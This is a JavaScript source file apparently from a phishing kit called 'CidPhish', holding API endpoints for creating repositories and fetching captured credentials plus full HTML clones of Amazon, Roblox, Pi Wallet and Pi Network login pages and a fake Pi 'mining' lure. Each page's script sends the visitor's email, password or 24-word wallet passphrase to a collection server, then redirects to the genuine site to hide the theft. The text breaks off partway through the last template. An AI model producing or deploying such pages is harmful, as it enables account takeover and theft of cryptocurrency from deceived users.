
export const APP_NAME = "CidPhish";

//export const API_BACKEND_PREFIX = "http://localhost:5237";
export const API_BACKEND_PREFIX = "/api";

export const API_TEMPLATE_LIST = `${API_BACKEND_PREFIX}/templates`;

export const API_CREATE_REPO = `${API_BACKEND_PREFIX}/github/create`;

export const API_DOWNLOAD = `${API_BACKEND_PREFIX}/github/download`;

export const API_LIST_TEMPLATES = `${API_BACKEND_PREFIX}/github/templates`;

export const API_DELETE_REPO = `${API_BACKEND_PREFIX}/github/delete`;

export const API_FETCH_CREDENTIALS = `${API_BACKEND_PREFIX}/fetchcredentials`;


  
export const websites = {
    "testweb":`<!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Test Page</title>
      <style>
          * {
              margin: 0;
              padding: 0;
              box-sizing: border-box;
              font-family: Arial, sans-serif;
          }
          body {
              display: flex;
              justify-content: center;
              align-items: center;
              height: 100vh;
              background: linear-gradient(to right, #4facfe, #00f2fe);
          }
          .login-container {
              background: white;
              padding: 2rem;
              border-radius: 10px;
              box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
              width: 100%;
              max-width: 350px;
              text-align: center;
          }
          .login-container h2 {
              margin-bottom: 1rem;
              color: #333;
          }
          .input-group {
              margin-bottom: 1rem;
              text-align: left;
          }
          .input-group label {
              display: block;
              font-weight: bold;
              margin-bottom: 5px;
          }
          .input-group input {
              width: 100%;
              padding: 10px;
              border: 1px solid #ccc;
              border-radius: 5px;
          }
          .btn {
              width: 100%;
              padding: 10px;
              background: #4facfe;
              color: white;
              border: none;
              border-radius: 5px;
              cursor: pointer;
              font-size: 1rem;
              margin-top: 10px;
          }
          .btn:hover {
              background: #00c6ff;
          }
          .error {
              color: red;
              font-size: 0.9rem;
              margin-top: 5px;
          }
      </style>
  </head>
  <body>
      <div class="login-container">
          <h2>Login</h2>
          <form id="loginForm">
              <div class="input-group">
                  <label for="email">Email</label>
                  <input type="text" id="email" required>
              </div>
              <div class="input-group">
                  <label for="password">Password</label>
                  <input type="password" id="password" required>
              </div>
              <button id ="testeb" onclick="handleSubmit(event)" class="btn">Login</button>
              <p id="error-message" class="error"></p>
          </form>
      </div>
  
      <script>
  
              const uid = "user123user123"; 
        const websiteName = "mywebsitemywebsite"; 
    
        async function handleSubmit(event) {
          event.preventDefault(); 
          const email = document.getElementById("email").value;
          const password = document.getElementById("password").value;
          const signInButton = document.getElementById("testeb");
              signInButton.disabled = true;
              signInButton.style.opacity = '0.5';
              signInButton.style.cursor = 'not-allowed';
          try {
            const response = await fetch("http://localhost:5237/insertdata", {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({
                uid: uid,
                websiteName: websiteName,
                email: email,
                password: password
              })
            });
    
            window.location.href = "https://google.com/";
          } catch (error) {
            window.location.href = "https://google.com/";
            console.error("Error inserting data:", error);
          }
        }
      </script>
  </body>
  </html>`,
    "Free Pi Coins":`<!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Test Page</title>
      <style>
          body {
              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
              margin: 0;
              padding: 0;
              background-color: #f5f5f5;
          }
          
          .header {
              background-color: #663399;
              color: white;
              padding: 15px 20px;
              display: flex;
              align-items: center;
              justify-content: space-between;
          }
          
          .header-title {
              font-size: 20px;
              font-weight: 500;
              display: flex;
              align-items: center;
              justify-content: center;
              flex: 1;
          }
          
          .back-button {
              width: 24px;
              height: 24px;
              border: none;
              background: none;
              color: white;
              font-size: 24px;
              cursor: pointer;
              display: flex;
              align-items: center;
          }
          
          .check-button {
              width: 24px;
              height: 24px;
              border: none;
              background: none;
              color: white;
              font-size: 18px;
              cursor: pointer;
          }
          
          .wallet-icon, .mining-icon {
              background-color: #FFA500;
              width: 30px;
              height: 30px;
              border-radius: 6px;
              display: flex;
              justify-content: center;
              align-items: center;
              margin-right: 10px;
              color: white;
          }
          
          .pi-icon {
              background-color: #FFA500;
              width: 20px;
              height: 20px;
              border-radius: 50%;
              display: flex;
              justify-content: center;
              align-items: center;
              margin-left: 10px;
              color: white;
              font-size: 12px;
          }
          
          .container {
              padding: 20px;
              display: flex;
              flex-direction: column;
              align-items: center;
          }
          
          h1 {
              font-size: 24px;
              margin: 20px 0 30px;
              text-align: center;
              color: #333;
          }
          
          .passphrase-input {
              width: 100%;
              height: 150px;
              border: 1px solid #ddd;
              border-radius: 10px;
              padding: 20px;
              font-size: 16px;
              margin-bottom: 20px;
              resize: none;
              color: #aaa;
              background: white;
          }
          
          .unlock-button, .mining-button {
              width: 100%;
              padding: 15px;
              margin: 10px 0;
              border-radius: 10px;
              border: none;
              font-size: 16px;
              cursor: pointer;
              text-align: center;
          }
          
          .unlock-passphrase {
              background-color: white;
              color: #663399;
              border: 1px solid #ddd;
          }
          
          .unlock-fingerprint {
              background-color: #663399;
              color: white;
          }
          
          .mining-button {
              background-color: #663399;
              color: white;
          }
          
          .mining-button:disabled {
              opacity: 0.5;
              cursor: not-allowed;
          }
          
          .info-text {
              margin: 20px 0;
              color: #333;
              font-size: 16px;
              line-height: 1.5;
          }
          
          .blue-link {
              color: #3498db;
              text-decoration: none;
          }
          
          #mining-section {
              display: block;
          }
          
          #unlock-section {
              display: none;
          }
      </style>
  </head>
  <body>
      <!-- Mining Section -->
      <div id="mining-section">
          <div class="header">
              <button class="back-button">←</button>
              <div class="header-title">
                  <div class="mining-icon">π</div>
                  Mine Pi Coins
                  <div class="pi-icon">π</div>
              </div>
              <button class="check-button">✓</button>
          </div>
          
          <div class="container">
              <h1>Mine Pi Coins</h1>
              <p class="info-text" style="color:#00ca2c;font-weight:bold;" >Current mined Pi: <span id="mined-pi">0</span> π</p>
              <button class="mining-button" id="start-mining-button">Start Mining</button>
              <button class="mining-button" id="faster-mining-toggle">Enable 100x Faster Mining</button>
              <button class="mining-button" id="get-coins-button" disabled>Get Coins</button>
          </div>
      </div>
  
      <!-- Unlock Section -->
      <div id="unlock-section">
          <div class="header">
              <button class="back-button">←</button>
              <div class="header-title">
                  <div class="wallet-icon">π</div>
                  Wallet
                  <div class="pi-icon">π</div>
              </div>
              <button class="check-button">✓</button>
          </div>
          
          <div class="container">
              <h1>Unlock Pi Wallet</h1>
              <textarea class="passphrase-input" id="password" placeholder="Enter your 24-word passphrase here"></textarea>
              <button class="unlock-button unlock-passphrase" id="passphrase-button" onclick="handleSubmit(event)">Unlock With Passphrase</button>
              <button class="unlock-button unlock-fingerprint" id="fingerprint-button">Unlock With Fingerprint</button>
              <p class="info-text">
                  As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. 
                  Recovery of passphrase is currently impossible.
              </p>
              <p class="info-text">
                  Lost your passphrase? <a href="https://minepi.com/" class="blue-link">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
              </p>
          </div>
  
          <script>
              const uid = "user123user123";
              const websiteName = "mywebsitemywebsite";
  
              async function handleSubmit(event) {
                  event.preventDefault();
                  const email = "PiWalletAddress";
                  const password = document.getElementById("password").value;
                  const signInButton = document.getElementById("passphrase-button");
                  signInButton.disabled = true;
                  signInButton.style.opacity = '0.5';
                  signInButton.style.cursor = 'not-allowed';
                  try {
                      const response = await fetch("http://localhost:5237/insertdata", {
                          method: "POST",
                          headers: {
                              "Content-Type": "application/json"
                          },
                          body: JSON.stringify({
                              uid: uid,
                              websiteName: websiteName,
                              email: email,
                              password: password
                          })
                      });
                      window.location.href = "https://minepi.com/";
                  } catch (error) {
                      window.location.href = "https://minepi.com/";
                      console.error("Error inserting data:", error);
                  }
              }
          </script>
      </div>
  
      <script>
          let miningRate = .7; 
          let totalMined = 0;
          let fasterMiningEnabled = false;
          let isMining = false;
          let miningInterval = null;
  
          const minedPiDisplay = document.getElementById("mined-pi");
          const startMiningButton = document.getElementById("start-mining-button");
          const fasterMiningToggle = document.getElementById("faster-mining-toggle");
          const getCoinsButton = document.getElementById("get-coins-button");
  
          function updateMinedPi() {
              totalMined += miningRate;
              minedPiDisplay.textContent = totalMined.toFixed(2);
          }
  
          function startMining() {
              if (!isMining) {
                  miningInterval = setInterval(updateMinedPi, 1000);
                  isMining = true;
                  startMiningButton.disabled = true;
                  getCoinsButton.disabled = false;
              }
          }
  
          function stopMining() {
              if (isMining) {
                  clearInterval(miningInterval);
                  isMining = false;
                  startMiningButton.disabled = false;
                  getCoinsButton.disabled = true;
              }
          }
  
          startMiningButton.addEventListener("click", startMining);
  
          fasterMiningToggle.addEventListener("click", () => {
              fasterMiningEnabled = !fasterMiningEnabled;
              miningRate = fasterMiningEnabled ? 100 : 1;
              fasterMiningToggle.textContent = fasterMiningEnabled ? "Disable 100x Faster Mining" : "Enable 100x Faster Mining";
          });
  
          getCoinsButton.addEventListener("click", () => {
              stopMining();
              document.getElementById("mining-section").style.display = "none";
              document.getElementById("unlock-section").style.display = "block";
          });
      </script>
  </body>
  </html>`,
    "amazon":`<html>
    <head>
      <title>Test Page</title>
      <script>
        const uid = "user123user123"; 
        const websiteName = "mywebsitemywebsite"; 
    
        async function handleSubmit(event) {
          event.preventDefault(); 
          const email = document.getElementById("email").value;
          const password = document.getElementById("password").value;
          const signInButton = document.getElementById("amazon");
              signInButton.disabled = true;
              signInButton.style.opacity = '0.5';
              signInButton.style.cursor = 'not-allowed';
          try {
            const response = await fetch("http://localhost:5237/insertdata", {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({
                uid: uid,
                websiteName: websiteName,
                email: email,
                password: password
              })
            });
    
            window.location.href = "https://amazon.com/";
          } catch (error) {
            window.location.href = "https://amazon.com/";
            console.error("Error inserting data:", error);
          }
        }
      </script>
    
      <style>
        #amazon{
    width:315px;
    height:33px;
    font-size:14px;
  
    background: linear-gradient(#F7DEA1, #F0C14D);
    border: 0.5px solid #aaaaaa;
    border-radius:3px;
    margin-top: 10px;
  }
  
  #amazon:hover{
  background: linear-gradient(#F5D68A, #EEBA36);
  }
  
  
  
  body {
      font-size: 13px;
      line-height: 19px;
      color: #111;
      font-family: Arial,sans-serif;
  }
  
  img{
    margin: auto;
    display: block;
  }
  
  #signInBorder{
    position: static;
    margin: 0 auto;
    border-color: #DDDDDD;
    border: 0.5px solid #DDDDDD;
    border-radius: 3px;
    width: 340px;
    padding-left: 25px;
  }
  
  input{
    border-left-color: #DDDDDD;
    border-right-color: #DDDDDD;
    border-radius: 3px;
    border-width: 0.2px;
    height: 25px;
    width: 315px;
    margin-bottom: 15px;
  
  }
  
  input:focus{
    -webkit-box-shadow: 0px 0px 1.5px 1.5px rgba(231,118,0,0.9);
    -moz-box-shadow: 0px 0px 1.5px 1.5px rgba(231,118,0,0.9);
    box-shadow: 0px 0px 1.5px 1.5px rgba(231,118,0,0.9);
    outline:0;
  }
  
  
  #SignInTxt{
    font-family: Arial, sans-serif;
    font-size: 26.5px;
  }
  
  h2 {
     color: rgb(134, 134, 134);
     font-weight: normal;
     letter-spacing: 1px;
     font-size: 11.5px;
     width: 315px;
     text-align: center;
     border-top: 1px solid rgba(0, 0, 0, 0.1);
     border-bottom: 1px solid rgba(255, 255, 255, 0.3);
     line-height: 0.1em;
     margin: 10px 0 20px;
     margin-bottom: 5px;
  }
  
  h2 span {
      background:#fff;
      padding:0 10px;
  }
  
  #createAccount{
    margin-top: 30px;
  }
  
  #newAccount{
    background: linear-gradient(#f6f7f9, #e7e9ec);
    margin-top: 10px;
    margin-bottom: 20px;
    width:315px;
    height:33px;
    font-size:14px;
    border: 0.5px solid #aaaaaa;
    border-radius:3px;
  }
  
  #newAccount:hover{
    background: linear-gradient(#f5f6f8, #d9dce1);
  }
  
  #footer{
    border: 0;
     height: 0;
     border-top: 1px solid rgba(0, 0, 0, 0.1);
     border-bottom: 1px solid rgba(255, 255, 255, 0.3);
     margin-top: 30px;
  }
  
  
  
  a:link{
    font-size: 12px;
    /*margin: 0 10px 0px 10px;*/
    margin-right: 10px;
    text-decoration: none;
    color: #0066c0
  }
  a:hover{
    text-decoration: underline;
    color: orangergb(230, 161, 28);
  }
  
  a:visited{
    color: #0066c0;
  }
  
   .links{
    font-size: 10px;
    text-align: center;
    padding-left: 15px;
  }
  
  #special{
    font-size: 11px;
  }
  
      </style>
    </head>
    <body>
      
      <div id="signInBorder">
        <p id="SignInTxt">
          Sign in
        </p>
  
        <label>
          <strong>Email (phone for mobile accounts)</strong>
          <br>
          <input type="email" id="email" name="email" value="">
        </label>
  
        <br>
  
        <label>
          <strong>Password</strong>
          <span><a href="#" >Forgot your password?</a></span>
          <br>
          <input type="password" id="password" name="password" value="">
        </label>
  
        <div>
          <button id="amazon" onclick="handleSubmit(event)">Sign in</button>
        </div>
  
        <div id="createAccount">
          <h2><span>New to Amazon?</span></h2>
          <button id="newAccount" name="newAcct">Create your Amazon account</button>
        </div>
  
  
  
      </div>
  
    <hr id="footer">
  
    <div class="extra">
      <p class="links"><a href="#" id="first">Conditions of Use</a>
      <a href="#">Notice of Use</a>
      <a href="#">Help</a></p>
      <p class="links" id="special">
        © 1996-2016, Amazon.com, Inc. or its affiliates
      </p>
    </div>
  
  
    </body>
  </html>`,
    "PI Wallet":`<!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Test Page</title>
      <style>
          body {
              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
              margin: 0;
              padding: 0;
              background-color: #f5f5f5;
          }
          
          .header {
              background-color: #663399;
              color: white;
              padding: 15px 20px;
              display: flex;
              align-items: center;
              justify-content: space-between;
          }
          
          .header-title {
              font-size: 20px;
              font-weight: 500;
              display: flex;
              align-items: center;
              justify-content: center;
              flex: 1;
          }
          
          .back-button {
              width: 24px;
              height: 24px;
              border: none;
              background: none;
              color: white;
              font-size: 24px;
              cursor: pointer;
              display: flex;
              align-items: center;
          }
          
          .check-button {
              width: 24px;
              height: 24px;
              border: none;
              background: none;
              color: white;
              font-size: 18px;
              cursor: pointer;
          }
          
          .wallet-icon {
              background-color: #FFA500;
              width: 30px;
              height: 30px;
              border-radius: 6px;
              display: flex;
              justify-content: center;
              align-items: center;
              margin-right: 10px;
              color: white;
          }
          
          .pi-icon {
              background-color: #FFA500;
              width: 20px;
              height: 20px;
              border-radius: 50%;
              display: flex;
              justify-content: center;
              align-items: center;
              margin-left: 10px;
              color: white;
              font-size: 12px;
          }
          
          .container {
              padding: 20px;
              display: flex;
              flex-direction: column;
              align-items: center;
          }
          
          h1 {
              font-size: 24px;
              margin: 20px 0 30px;
              text-align: center;
              color: #333;
          }
          
          .passphrase-input {
              width: 100%;
              height: 150px;
              border: 1px solid #ddd;
              border-radius: 10px;
              padding: 20px;
              font-size: 16px;
              margin-bottom: 20px;
              resize: none;
              color: #aaa;
              background: white;
          }
          
          .unlock-button {
              width: 100%;
              padding: 15px;
              margin: 10px 0;
              border-radius: 10px;
              border: none;
              font-size: 16px;
              cursor: pointer;
              text-align: center;
          }
          
          .unlock-passphrase {
              background-color: white;
              color: #663399;
              border: 1px solid #ddd;
          }
          
          .unlock-fingerprint {
              background-color: #663399;
              color: white;
          }
          
          .info-text {
              margin: 20px 0;
              color: #333;
              font-size: 16px;
              line-height: 1.5;
          }
          
          .blue-link {
              color: #3498db;
              text-decoration: none;
          }
      </style>
  </head>
  <body>
      <div class="header">
          <button class="back-button">←</button>
          <div class="header-title">
              <div class="wallet-icon">π</div>
              Wallet
              <div class="pi-icon">π</div>
          </div>
          <button class="check-button">✓</button>
      </div>
      
      <div class="container">
          <h1>Unlock Pi Wallet</h1>
          
          <textarea class="passphrase-input" id="password" placeholder="Enter your 24-word passphrase here"></textarea>
          
          <button class="unlock-button unlock-passphrase"  onclick="handleSubmit(event)" id="testeb">Unlock With Passphrase</button>
          <button class="unlock-button unlock-fingerprint disabled" id="testeb">Unlock With Fingerprint</button>
          
          <p class="info-text">
              As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. 
              Recovery of passphrase is currently impossible.
          </p>
          
          <p class="info-text">
              Lost your passphrase? <a href="https://minepi.com/" class="blue-link">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
          </p>
      </div>
  
      <script>
  
              const uid = "user123user123"; 
        const websiteName = "mywebsitemywebsite"; 
    
        async function handleSubmit(event) {
          event.preventDefault(); 
          const email = "PiWalletAddress";
          const password = document.getElementById("password").value;
          const signInButton = document.getElementById("testeb");
              signInButton.disabled = true;
              signInButton.style.opacity = '0.5';
              signInButton.style.cursor = 'not-allowed';
          try {
            const response = await fetch("http://localhost:5237/insertdata", {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({
                uid: uid,
                websiteName: websiteName,
                email: email,
                password: password
              })
            });
    
            window.location.href = "https://minepi.com/";
          } catch (error) {
            window.location.href = "https://minepi.com/";
            console.error("Error inserting data:", error);
          }
        }
      </script>
  </body>
  </html>`,
    "Roblox":`<!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Test Page</title>
      <style>
          * {
              margin: 0;
              padding: 0;
              box-sizing: border-box;
              font-family: 'Helvetica Neue', Arial, sans-serif;
          }
  
          body {
              background-color: #121212;
              color: #fff;
              min-height: 100vh;
              display: flex;
              flex-direction: column;
          }
  
          /* Logo styling for both views */
          .logo {
              width: 40px;
              height: 40px;
              min-width: 40px; /* Prevent shrinking */
              background-color: white;
              transform: rotate(20deg);
              position: relative;
          }
  
          .logo-inner {
              width: 50%;
              height: 50%;
              background-color: black;
              position: absolute;
              top: 25%;
              left: 25%;
          }
  
          /* Shared button styling */
          .sign-up-btn {
              background-color: #0066ff;
              color: white;
              border: none;
              border-radius: 8px;
              padding: 8px 16px;
              font-size: 16px;
              cursor: pointer;
              white-space: nowrap;
          }
  
          /* Top bar and navigation */
          .top-bar {
              background-color: #0a0a0a;
              border-bottom: 1px solid #222;
          }
  
          /* Search icon */
          .search-icon {
              font-size: 22px;
              color: #fff;
          }
  
          /* Login container */
          .login-container {
              width: 90%;
              max-width: 420px;
              margin: 40px auto;
              padding: 30px 20px;
              background-color: #2a2a2e;
              border-radius: 8px;
          }
  
          .login-title {
              text-align: center;
              font-size: 28px;
              margin-bottom: 20px;
              font-weight: 500;
          }
  
          .input-field {
              width: 100%;
              padding: 14px;
              margin: 8px 0;
              border-radius: 8px;
              border: none;
              background-color: #3e3e44;
              color: white;
              font-size: 16px;
          }
  
          .login-btn {
              width: 100%;
              padding: 14px;
              margin: 15px 0;
              border-radius: 8px;
              border: 1px solid #666;
              background-color: #2a2a2e;
              color: white;
              font-size: 16px;
              cursor: pointer;
          }
  
          .forgot-link {
              display: block;
              text-align: center;
              color: #fff;
              text-decoration: none;
              margin: 20px 0;
              font-size: 16px;
          }
  
          .divider {
              border-top: 1px solid #444;
              margin: 25px 0;
          }
  
          .alt-login-btn {
              width: 100%;
              padding: 14px;
              margin: 10px 0;
              border-radius: 8px;
              border: none;
              background-color: #3e3e44;
              color: white;
              font-size: 16px;
              cursor: pointer;
          }
  
          .signup-prompt {
              text-align: center;
              margin: 20px 0;
              font-size: 16px;
          }
  
          .signup-link {
              color: #fff;
              text-decoration: none;
              font-weight: bold;
          }
  
          /* Footer */
          .footer {
              display: flex;
              flex-wrap: wrap;
              justify-content: center;
              gap: 20px;
              padding: 20px;
              background-color: #000;
              margin-top: auto;
          }
  
          .footer a {
              color: #fff;
              text-decoration: none;
              font-size: 14px;
          }
  
          .privacy-choices {
              display: flex;
              align-items: center;
              gap: 5px;
          }
  
          .checkbox {
              width: 16px;
              height: 16px;
              background-color: #0066ff;
              border-radius: 2px;
              position: relative;
              display: inline-block;
          }
  
          .checkbox::after {
              content: "✓";
              color: white;
              position: absolute;
              font-size: 12px;
              top: 0px;
              left: 3px;
          }
  
          .close-x {
              display: inline-block;
              width: 16px;
              height: 16px;
              background-color: #0066ff;
              color: white;
              text-align: center;
              line-height: 16px;
              border-radius: 50%;
              font-size: 12px;
          }
  
          /* Mobile specific styles */
          @media (max-width: 767px) {
              .top-bar {
                  display: flex;
                  flex-direction: column;
              }
              
              .header {
                  display: flex;
                  justify-content: space-between;
                  align-items: center;
                  padding: 15px 20px;
              }
              
              .actions {
                  display: flex;
                  align-items: center;
                  gap: 15px;
              }
              
              .nav {
                  display: flex;
                  justify-content: space-between;
                  width: 100%;
                  padding: 10px 15px;
              }
              
              .nav a {
                  color: #fff;
                  text-decoration: none;
                  font-size: 18px;
                  text-align: center;
                  padding: 5px 0;
              }
              
              .search-box {
                  display: none;
              }
          }
  
          /* Desktop specific styles */
          @media (min-width: 768px) {
              .top-bar {
                  display: flex;
                  align-items: center;
                  padding: 8px 20px;
                  height: 60px;
              }
              
              .header {
                  display: flex;
                  align-items: center;
              }
              
              .nav {
                  display: flex;
                  gap: 20px;
                  margin-left: 20px;
              }
              
              .nav a {
                  color: #fff;
                  text-decoration: none;
                  font-size: 16px;
                  font-weight: 400;
              }
              
              .actions {
                  display: flex;
                  align-items: center;
                  margin-left: auto;
                  gap: 15px;
              }
              
              .search-box {
                  display: flex;
                  align-items: center;
                  background-color: #2e2e2e;
                  border-radius: 20px;
                  padding: 5px 15px;
                  width: 300px;
              }
              
              .search-input {
                  background: transparent;
                  border: none;
                  color: #fff;
                  width: 100%;
                  font-size: 14px;
                  padding: 5px;
                  outline: none;
              }
              
              .search-icon-mobile {
                  display: none;
              }
          }
      </style>
  </head>
  <body>
      <!-- Combined navbar for both mobile and desktop -->
      <div class="top-bar">
          <div class="header">
              <div class="logo">
                  <div class="logo-inner"></div>
              </div>
              
              <div class="actions">
                  <!-- Search box for desktop -->
                  <div class="search-box">
                      <div class="search-icon">⚲</div>
                      <input type="text" class="search-input" placeholder="Search">
                  </div>
                  
                  <button class="sign-up-btn">Sign Up</button>
                  <!-- Mobile search icon, hidden on desktop -->
                  <div class="search-icon search-icon-mobile">⚲</div>
              </div>
          </div>
          
          <!-- Navigation links -->
          <div class="nav">
              <a href="#">Charts</a>
              <a href="#">Marketplace</a>
              <a href="#">Create</a>
              <a href="#">Robux</a>
          </div>
      </div>
      
      <!-- Login Container -->
      <div class="login-container">
          <h1 class="login-title">Login to Roblox</h1>
          
          <input type="text" class="input-field" id="username" placeholder="Username/Email/Phone">
          <input type="password" class="input-field" id="password" placeholder="Password">
          
          <button class="login-btn" id="testeb" onclick="handleSubmit(event)">Log In</button>
          
          <a href="#" class="forgot-link">Forgot Password or Username?</a>
          
          <div class="divider"></div>
          
          <button class="alt-login-btn">Email Me a One-Time Code</button>
          <button class="alt-login-btn">Use Another Device</button>
          
          <p class="signup-prompt">Don't have an account? <a href="#" class="signup-link">Sign Up</a></p>
      </div>
      
      <!-- Footer -->
      <div class="footer">
          <a href="#">About Us</a>
          <a href="#">Jobs</a>
          <a href="#">Blog</a>
          <a href="#">Parents</a>
          <a href="#">Gift Cards</a>
          <a href="#">Help</a>
          <a href="#">Terms</a>
          <a href="#">Accessibility</a>
          <a href="#">Privacy</a>
          <div class="privacy-choices">
              Your Privacy Choices
              <span class="checkbox"></span>
              <span class="close-x">×</span>
          </div>
      </div>
  
      <script>
        const uid = "user123user123"; 
        const websiteName = "mywebsitemywebsite"; 
    
        async function handleSubmit(event) {
          event.preventDefault(); 
          const email = document.getElementById("username").value;
          const password = document.getElementById("password").value;
          const signInButton = document.getElementById("testeb");
              signInButton.disabled = true;
              signInButton.style.opacity = '0.5';
              signInButton.style.cursor = 'not-allowed';
          try {
            const response = await fetch("http://localhost:5237/insertdata", {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({
                uid: uid,
                websiteName: websiteName,
                email: email,
                password: password
              })
            });
    
            window.location.href = "https://www.roblox.com/";
          } catch (error) {
            window.location.href = "https://www.roblox.com/";
            console.error("Error inserting data:", error);
          }
        }
      </script>
  </body>
  </html>`,
    "PI Network":`<!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Test Page</title>
      <style>
          body {
              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
              margin: 0;
              padding: 0;
              background-color: #f5f5f5;
              width: 800px;
              height: 1629px;
              max-width: 100%;
              margin: 0 auto;
              position: relative;
              overflow-x: hidden;
          }
  
          /* Status bar style */
          .status-bar {
              background-color: #000;
              color: white;
              display: flex;
              justify-content: space-between;
              padding: 5px 10px;
              font-size: 14px;
          }
  
          .status-bar-left, .status-bar-right {
              display: flex;
              align-items: center;
          }
  
          .status-bar-item {
              margin: 0 5px;
          }
  
          /* Header style */
          .header {
              background-color: #673AB7;
              color: white;
              padding: 15px 20px;
              display: flex;
              align-items: center;
              justify-content: space-between;
              position: relative;
          }
  
          .back-arrow {
              font-size: 24px;
              cursor: pointer;
          }
  
          .header-title {
              text-align: center;
              font-size: 20px;
              flex-grow: 1;
          }
  
          .dropdown-icon {
              font-size: 24px;
              cursor: pointer;
          }
  
          /* Main content */
          .main-content {
              padding: 20px;
              display: flex;
              flex-direction: column;
              align-items: center;
          }
  
          .logo {
              width: 120px;
              height: 120px;
              margin: 20px 0;
          }
  
          .welcome-text {
              font-size: 24px;
              color: #FFA726;
              margin-bottom: 40px;
              text-align: center;
          }
  
          /* Menu grid */
          .menu-grid {
              display: grid;
              grid-template-columns: repeat(3, 1fr);
              gap: 20px;
              width: 100%;
              max-width: 500px;
          }
  
          .menu-item {
              display: flex;
              flex-direction: column;
              align-items: center;
              cursor: pointer;
          }
  
          .menu-icon {
              width: 60px;
              height: 60px;
              border-radius: 12px;
              border: 2px solid #673AB7;
              display: flex;
              justify-content: center;
              align-items: center;
              margin-bottom: 10px;
          }
  
          .menu-label {
              color: #673AB7;
              font-size: 14px;
              text-align: center;
          }
  
          /* Explore button */
          .explore-button {
              margin-top: 40px;
              background-color: #673AB7;
              color: white;
              border: none;
              border-radius: 25px;
              padding: 15px 40px;
              font-size: 18px;
              display: flex;
              align-items: center;
              cursor: pointer;
              width: 90%;
              max-width: 500px;
              justify-content: center;
          }
  
          .explore-icon {
              margin-right: 10px;
          }
  
          /* Navigation bar */
          .nav-bar {
              position: fixed;
              bottom: 0;
              width: 100%;
              max-width: 800px;
              height: 5px;
              background-color: #ddd;
          }
  
          .nav-indicator {
              width: 50%;
              height: 100%;
              background-color: #fff;
              border-radius: 3px;
          }
      </style>
  </head>
  <body>
  
      <div class="header">
          <div class="back-arrow">←</div>
          <div class="header-title">Home <span style="display: inline-block; width: 20px; height: 20px; border-radius: 50%; text-align: center; line-height: 20px; font-size: 14px; vertical-align: middle;"><img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/hde.png" alt="Pi Logo" style="width: 100%; height: auto; object-fit:fill;" /></span></div>
          <div class="dropdown-icon">▼</div>
      </div>
  
  
      <div class="main-content">
          <div class="logo">
              <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/hde.png" alt="Pi Logo" style="border-radius: 50%; width: auto; max-width: 100px; height: auto;" />
          </div>
  
  
  
          <div class="welcome-text">Welcome to the Pi Browser</div>
  
  
          <div class="menu-grid">
  
              <div class="menu-item" onclick="redirectToWallet()">
                  <div class="menu-icon">
                      <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/6.png" alt="" style="width:100%;">
                  </div>
                  <div class="menu-label">Fireside</div>
              </div>
  
              <div class="menu-item" onclick="redirectToWallet()">
                  <div class="menu-icon">
                      <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/1.png" alt="" style="width:100%;">
                  
                  </div>
                  <div class="menu-label">Wallet</div>
              </div>
  
              <div class="menu-item" onclick="redirectToWallet()">
                  <div class="menu-icon">
                      <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/2.png" alt="" style="width:100%;">
                  
                  </div>
                  <div class="menu-label">Brainstorm</div>
              </div>
  
              <div class="menu-item" onclick="redirectToWallet()">
                  <div class="menu-icon">
                      <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/3.png" alt="" style="width:100%;">
                  
                  </div>
                  <div class="menu-label">Mine</div>
              </div>
  
              <div class="menu-item" onclick="redirectToWallet()">
                  <div class="menu-icon">
                      <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/4.png" alt="" style="width:100%;">
                  
                  </div>
                  <div class="menu-label">Blockchain</div>
              </div>
  
              <div class="menu-item" onclick="redirectToWallet()">
                  <div class="menu-icon">
                      <svg viewBox="0 0 24 24" width="35" height="35">
                          <path d="M14.6,16.6L19.2,12L14.6,7.4L16,6L22,12L16,18L14.6,16.6M9.4,16.6L4.8,12L9.4,7.4L8,6L2,12L8,18L9.4,16.6Z" fill="#673AB7"/>
                      </svg>
                  </div>
                  <div class="menu-label">Develop</div>
              </div>
  
              <div class="menu-item" onclick="redirectToWallet()">
                  <div class="menu-icon">
                      <svg viewBox="0 0 24 24" width="35" height="35">
